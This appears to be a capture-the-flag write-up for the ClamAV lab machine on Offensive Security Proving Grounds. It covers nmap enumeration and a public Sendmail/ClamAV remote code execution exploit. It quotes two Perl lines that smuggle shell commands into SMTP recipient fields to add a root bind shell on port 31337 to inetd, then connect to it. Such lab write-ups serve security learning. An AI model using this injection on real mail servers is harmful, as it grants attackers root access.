---
description: Writeup for ClamAV from Offensive Security Proving Grounds (PG)
---

# ClamAV

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.66.42 -t full`

`nmapAutomator.sh -H 192.168.66.42 -t vulns`

### HTTP \(80\)

There is a page with a binary message.

![](../../.gitbook/assets/3342f2f11cfc42618aa17e3eb8bba819.png)

Challenge accepted!

![](../../.gitbook/assets/d5281477516244f9be04e9f9667f8fff.png)

### SMTP \(25\)

We can see that Sendmail 8.13.4 is used.

![](../../.gitbook/assets/c33c363b72e9469b918f7ec5954f33e8.png)

## Exploitation

We find the following Sendmail + ClamAV RCE exploit:

{% embed url="https://www.exploit-db.com/exploits/4761" %}

The two lines in the Perl script:

```perl
print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n";
```

appear to open port 31337 as a root shell.

After running the script, the port is indeed open.

![](../../.gitbook/assets/ec04a5882dc94178865b659ca2d9f8d1.png)

Upon connecting to the bind shell, use `bash -i` to upgrade to a fully interactive shell.

![](../../.gitbook/assets/546f313076fa47fe9238f4bf46edd627.png)

